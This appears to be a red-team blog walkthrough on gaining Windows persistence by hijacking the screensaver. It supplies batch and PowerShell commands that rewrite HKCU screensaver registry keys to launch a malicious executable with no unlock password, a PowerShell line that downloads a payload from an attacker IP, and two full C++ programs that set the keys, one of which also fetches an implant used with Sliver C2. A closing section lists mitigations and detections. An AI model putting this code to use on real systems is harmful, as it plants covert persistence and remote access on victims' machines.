# Persistence through Windows Screensaver Hijacking

> Austin Lai | August 17th, 2022

---

<!-- Description -->

Brief description: A simple walkthrough on Windows Screensaver Hijacking for persistence.

<!-- /Description -->

## Table of Contents

<!-- TOC -->

- [Persistence through Windows Screensaver Hijacking](#persistence-through-windows-screensaver-hijacking)
    - [Table of Contents](#table-of-contents)
    - [Introduction](#introduction)
    - [Simple Demo](#simple-demo)
        - [ScreensaverHijack with command PWNED](#screensaverhijack-with-command-pwned)
        - [ScreensaverHijack with sliver implants](#screensaverhijack-with-sliver-implants)
        - [Code with CPP for registry changer](#code-with-cpp-for-registry-changer)
        - [Code with CPP for registry changer along with download malicious executable](#code-with-cpp-for-registry-changer-along-with-download-malicious-executable)
            - [ScreensaverHijack using CPP for registry changer and download sliver implants](#screensaverhijack-using-cpp-for-registry-changer-and-download-sliver-implants)
    - [Additional Information](#additional-information)

<!-- /TOC -->

## Introduction

Screensavers are programs that execute after a configurable time of user inactivity, an adversaries may establish persistence by executing malicious content triggered by screensavers. This feature of Windows it is known to be abused by threat actors as a method of persistence.

Screensavers are Portable Executable (PE) files with a `.scr` extension by default. The Windows screensaver application `scrnsave.scr` is located in `C:\Windows\System32\` and `C:\Windows\sysWOW64\` on 64-bit Windows systems, along with screensavers included with base Windows installations.

The following screensaver settings are stored in the Registry (`HKCU\Control Panel\Desktop\`) and could be manipulated to achieve persistence:

- `SCRNSAVE.exe` - set to malicious PE path.
- `ScreenSaveActive` - set to '1' to enable the screensaver.
- `ScreenSaverIsSecure` - set to '0' to not require a password to unlock.
- `ScreenSaveTimeout` - sets user inactivity timeout before screensaver is executed.

This is low level persistence technique as the registry keys stored under ???HKCU??? which does not require system privilege. Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain time-frame of user inactivity.

## Simple Demo

To demo this, we will set the screensaver path to basic batch script to load message box to display "You are Pwned!" with the idle time of 10 seconds when the user is inactive.

Sample basic batch script as below:

```batch
@echo off
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /d 10 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaveActive /d 1 /f
reg add "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /d 0 /f
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\Temp\pwn.bat /f

echo @echo off > C:\Windows\Temp\pwn.bat
echo msg %username% You are Pwned! >> C:\Windows\Temp\pwn.bat
```

You may also use powershell script with below:

```powershell
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveTimeOut' -Value '10' -Force
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive' -Value '1' -Force
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverIsSecure' -Value '0' -Force
New-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Value 'C:\Windows\Temp\pwn.bat' -Force
```

Once the registry changed, you may use command below to verify registry:

```batch
reg query "HKCU\Control Panel\Desktop" /s
```

If you want to remove the artifacts of registry, you can use powershell or normal dos command below:

```powershell
Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveTimeOut' -Force
Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaveActive' -Force
Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'ScreenSaverIsSecure' -Force
Remove-ItemProperty -Path 'HKCU:\Control Panel\Desktop\' -Name 'SCRNSAVE.EXE' -Force
```

```batch
reg delete "HKCU\Control Panel\Desktop" /v ScreenSaveTimeOut /f
reg delete "HKCU\Control Panel\Desktop" /v ScreenSaveActive /f
reg delete "HKCU\Control Panel\Desktop" /v ScreenSaverIsSecure /f
reg delete "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /f
```

Adversaries may use tools such as Sliver C2 implants/beacon, reverse shell from msfvenom or even simple socat/powershell to callback to attacker machines. Simply added line below to download the malicious executable and change the path of ???SCRNSAVE.EXE??? to malicious executable.

```batch
reg add "HKCU\Control Panel\Desktop" /v SCRNSAVE.EXE /d C:\Windows\Temp\plogin.exe /f

powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://192.168.147.6/plogin.exe', 'C:\Windows\Temp\plogin.exe')"
```

### ScreensaverHijack with command PWNED

![ScreensaverHijack-with-command-PWNED](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-command-PWNED.gif)

### ScreensaverHijack with sliver implants

![ScreensaverHijack-with-sliver-implants](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-with-sliver-implants.gif)

### Code with CPP for registry changer

**Below code can be use in mingw32 or Nix environment**

We may also use C++ and compile as screensaver register key changer executable using command below:

```bash
x86_64-w64-mingw32-g++ -O2 screensaver-reg.cpp -o screensaver-reg.exe -I /usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```

Sample of C++ code as below:

```c++
#include <windows.h>
#include <string.h>
#include <iostream>

using namespace std;

int reg_key_compare(HKEY hKeyRoot, char* lpSubKey, char* regVal, char* compare) {
  HKEY hKey = nullptr;
  LONG ret;
  char value[1024];
  DWORD size = sizeof(value);
  ret = RegOpenKeyExA(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
  if (ret == ERROR_SUCCESS) {
    RegQueryValueExA(hKey, regVal, NULL, NULL, (LPBYTE)value, &size);
    if (ret == ERROR_SUCCESS) {
      if (strcmp(value, compare) == 0) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;
  
  // Change this to point to YOUR EXE/Script
  const char* placeholder = "C:\\Windows\\Temp\\plogin.exe";
  
  // Change timeouts duration
  const char* timeouts = "5";
  
  // Enable screensavers
  const char* enabled_screensavers = "1";
  
  // Disabled password
  const char* disabled_password = "0";

  // startup
  LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"Control Panel\\Desktop", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry keys
    RegSetValueEx(hkey, (LPCSTR)"ScreenSaveActive", 0, REG_SZ, (unsigned char*)enabled_screensavers, strlen(enabled_screensavers));
    RegSetValueEx(hkey, (LPCSTR)"ScreenSaveTimeOut", 0, REG_SZ, (unsigned char*)timeouts, strlen(timeouts));
    RegSetValueEx(hkey, (LPCSTR)"ScreenSaverIsSecure", 0, REG_SZ, (unsigned char*)disabled_password, strlen(disabled_password));
    RegSetValueEx(hkey, (LPCSTR)"SCRNSAVE.EXE", 0, REG_SZ, (unsigned char*)placeholder, strlen(placeholder));
    RegCloseKey(hkey);
  }
  return 0;
}
```

### Code with CPP for registry changer along with download malicious executable

**Below code only compatible with Windows Visual Studio**

```c++
#include <winsock2.h>
#include <windows.h>
#include <stdlib.h>
#include <iostream>
#include <string>

//To use urlmon and download to file 
#include <Urlmon.h>
#pragma comment(lib,"urlmon.lib")
#pragma comment(lib, "Advapi32.lib")

using namespace std;

static size_t write_data(void *ptr, size_t size, size_t nmemb, void *stream)
{
    size_t written = fwrite(ptr, size, nmemb, (FILE *)stream);
    return written;
}

int reg_key_compare(HKEY hKeyRoot, char *lpSubKey, char *regVal, char *compare)
{
    HKEY hKey = nullptr;
    LONG ret;
    char value[1024];
    DWORD size = sizeof(value);
    ret = RegOpenKeyExA(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
    if (ret == ERROR_SUCCESS)
    {
        RegQueryValueExA(hKey, regVal, NULL, NULL, (LPBYTE)value, &size);
        if (ret == ERROR_SUCCESS)
        {
            if (strcmp(value, compare) == 0)
            {
                return TRUE;
            }
        }
    }
    return FALSE;
}

int main(int argc, char *argv[])
{
    HKEY hkey = NULL;

    // Change this to point to YOUR EXE/Script
    const char *placeholder = "C:\\Windows\\Temp\\plogin.exe";

    // Change timeouts duration
    const char *timeouts = "10";

    // Enable screensavers
    const char *enabled_screensavers = "1";

    // Disabled password
    const char *disabled_password = "0";

    // startup
    LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) "Control Panel\\Desktop", 0, KEY_WRITE, &hkey);
    if (res == ERROR_SUCCESS)
    {
        // create new registry keys
        RegSetValueEx(hkey, (LPCSTR) "ScreenSaveActive", 0, REG_SZ, (unsigned char *)enabled_screensavers, strlen(enabled_screensavers));
        RegSetValueEx(hkey, (LPCSTR) "ScreenSaveTimeOut", 0, REG_SZ, (unsigned char *)timeouts, strlen(timeouts));
        RegSetValueEx(hkey, (LPCSTR) "ScreenSaverIsSecure", 0, REG_SZ, (unsigned char *)disabled_password, strlen(disabled_password));
        RegSetValueEx(hkey, (LPCSTR) "SCRNSAVE.EXE", 0, REG_SZ, (unsigned char *)placeholder, strlen(placeholder));
        RegCloseKey(hkey);
    }

    // Enable this if you need to download payload to the victim machines
    // Change this to suit your application
    HRESULT hr = URLDownloadToFile(0, "http://192.168.147.6/plogin.exe", "C:\\Windows\\Temp\\plogin.exe", 0, NULL);
    if (hr == S_OK) {
        cout << "ok" << endl;
    }
    
    return 0;
}
```

**To compile**, use Visual Studio built compiler. Navigate to `C:\Program Files\Microsoft Visual Studio\2022\Community` or whatever version you installed, OR; simply open `Developer Command Prompt for VS 2022`.

```dos
<!-- Format as below: -->
<!-- cl PATH-to-CPP-File /Fe:PATH-to-output-FILE -->

cl scrnsave-reg-austin-v3.cpp /Fe:scrnsave-reg-austin-v3.exe
```

**You may use libcurl to download the file as well, however in the example here did not managed to compile due to linker error.**

#### ScreensaverHijack using CPP for registry changer and download sliver implants

![ScreensaverHijack-using-CPP-for-registry-changer-and-download-sliver-implants.gif](https://github.com/austin-lai/Persistence-through-Windows-Screensaver-Hijacking/blob/master/ScreensaverHijack-using-CPP-for-registry-changer-and-download-sliver-implants.gif)

## Additional Information

This persistence technique mapping MITRE ATT&CK as below:

- TA0003/Persistence
- T1546/Event Triggered Execution
- T1546.002/Event Triggered Execution: Screensaver

To mitigate this, we should:

- Use Group Policy to disable screensavers if they are unnecessary.
- Block `.scr` files from being executed from non-standard locations.

Blue team should also include below for detection:

- Monitor process execution and command-line parameters of `.scr` files.
- Monitor changes to screensaver configuration changes in the Registry that may not correlate with typical user behavior.
- Though, many security solution including in-built Windows Defender will be able to monitor and detect this persistence method.

Assumption:

- Screensavers are NOT DISABLED by group policy.
- Bypass or managed to disabled Windows Defender.
- Session will drop when the user returns back and the system is not in idle mode.
- If intend to use powershell script, will need to bypass Windows Defender and allow powershell script to execute.

<br />

---

> Do let me know any command or step can be improve or you have any question you can contact me via THM message or write down comment below or via FB
